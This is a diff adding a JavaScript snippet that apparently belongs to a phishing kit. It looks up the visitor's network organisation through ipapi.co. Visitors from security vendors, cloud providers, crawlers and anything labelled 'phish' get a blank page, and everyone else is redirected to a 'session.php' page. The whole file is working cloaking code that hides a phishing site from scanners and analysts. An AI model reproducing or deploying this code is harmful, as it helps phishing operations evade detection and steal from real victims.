@@ -1,0 +1,136 @@
+                        
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://ipapi.co/org/', true);
+xhr.responseType = 'text';
+xhr.onload = function () {
+if (xhr.readyState === xhr.DONE) {
+if (xhr.status === 200) {
+var e182da444463b2c6f3c1e7abdd96afc8da7f00d81 = xhr.response;
+if (
+e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("LGBT") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Amazon.com") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Amazon") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Chrome") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Google") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("phish") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Paypal") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("DedFiberCo") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Palo Alto Networks") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Digital Ocean") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("DigitalOcean") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Google Cloud") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Cloud") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("107.178.194.44") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Trustwave Holdings") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Holdings") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Trustwave") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("SoftLayer Technologies") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("SoftLayer") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("SurfControl") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("EGIHosting") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("LogicWeb") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Choopa") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Shinjiru") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("LogicWeb") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Total Server Solutions") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Brookhaven National Laboratory") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("OVH Hosting") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("XFERA Moviles S.A.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("AVAST") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Privax Ltd.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Privax") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("M247 Europe SRL") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Wintek Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Amazon.com, Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Kaspersky Lab AO") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("TELEFÔNICA BRASIL S.A") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("UK-2 Limited") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Online S.a.s.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("BullGuard ApS") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("net4sec UG") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Datacamp Limited") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("HostDime.com, Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Digital Energy Technologies Ltd.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("New Dream Network, LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("LeaseWeb Netherlands B.V.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Hetzner Online GmbH") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Rakuten Communications Corp.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Forcepoint Cloud Ltd") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("IP Volume inc") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("NTT PC Communications, Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Liberty Global B.V.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Google LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("PALO ALTO NETWORKS") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("ColoCrossing") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Forcepoint, LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("SINET, Cambodia's specialist Internet and Telecom Service Provider.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("DigitalOcean, LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Soyuz LTD") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Internap Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Nameshield SAS") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Microsoft Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("VNPT Corp") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("PVimpelCom") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("net4sec UG") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Wintek Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("EAGLE SKY CO LT") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("SoftLayer Technologies Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Leaseweb USA, Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("HETZNER") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("F5 Networks, Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("British Telecommunications PLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("GigeNET") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("FASTER CZ spol. s r.o.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Cogent Communications") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Renater") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("InterNetX GmbH") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Forcepoint Cloud Ltd") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("The Corporation for Financing & Promoting Technology") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("PALO ALTO NETWORKS") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("TerraTransit AG") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Joshua Peter McQuistan") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Commtouch Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("YANDEX LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("M247 Ltd") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("RateLimited") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Hot-Net internet services Ltd.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("NTT Communications Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Hetzner Online GmbH") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Sungard Availability Network Solutions") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Network Solutions") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("McAfee") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Google Proxy") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Contina Communications, LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("77") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Almouroltec Servicos De Informatica E Internet Lda") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("HL komm Telekommunikations GmbH") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Symantec Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("KVCHOSTING.COM LLC") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Tiscali SpA") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Vertical Telecoms Pty Ltd") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("1&1 Internet SE") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("AVAST Software s.r.o.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Microsoft Corporation") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Total Server Solutions L.L.C") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("EVANZO e-commerce GmbH") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("TM Net, Internet Service Provider") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("ESET, spol. s r.o.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Atlantic.net, Inc.") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("Venus Business Communications Limited") >= 0
+|| e182da444463b2c6f3c1e7abdd96afc8da7f00d81.indexOf("OVH SAS") >= 0
+){
+window.location.href = "";
+}else {
+window.location.href = "session.php?AoWEiJlh19882252128=AoWEiJlh19882252128-182da444463b2c6f3c1e7abdd96afc8da7f00d81";
+}
+        }
+    }
+};
+
+xhr.send(null);
+
+
+
+</script>                                
